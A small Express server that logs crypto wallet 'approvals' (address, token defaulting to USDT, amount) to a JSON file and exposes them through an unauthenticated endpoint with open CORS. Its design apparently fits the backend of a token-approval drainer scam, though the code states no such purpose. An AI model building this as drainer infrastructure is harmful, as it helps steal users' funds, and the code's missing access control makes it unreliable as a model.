const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const cors = require("cors");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors()); // Allow frontend requests from anywhere
app.use(bodyParser.json());

// File to store wallet approvals
const WALLET_FILE = path.join(__dirname, "wallets.json");

// Ensure wallets.json exists
if (!fs.existsSync(WALLET_FILE)) {
  fs.writeFileSync(WALLET_FILE, JSON.stringify([]));
}

// POST: Save wallet approval
app.post("/api/notify", (req, res) => {
  const { wallet, token, amount } = req.body;

  if (!wallet) return res.status(400).json({ error: "Wallet address required" });

  const data = JSON.parse(fs.readFileSync(WALLET_FILE, "utf-8"));

  data.push({
    wallet,
    token: token || "USDT",
    amount: amount || 0,
    timestamp: Date.now()
  });

  fs.writeFileSync(WALLET_FILE, JSON.stringify(data, null, 2));
  res.json({ message: "Wallet saved successfully" });
});

// GET: Fetch all wallets
app.get("/api/wallets", (req, res) => {
  const data = JSON.parse(fs.readFileSync(WALLET_FILE, "utf-8"));
  res.json(data);
});

// Health check
app.get("/", (req, res) => res.send("Server is running"));

// Start server
app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
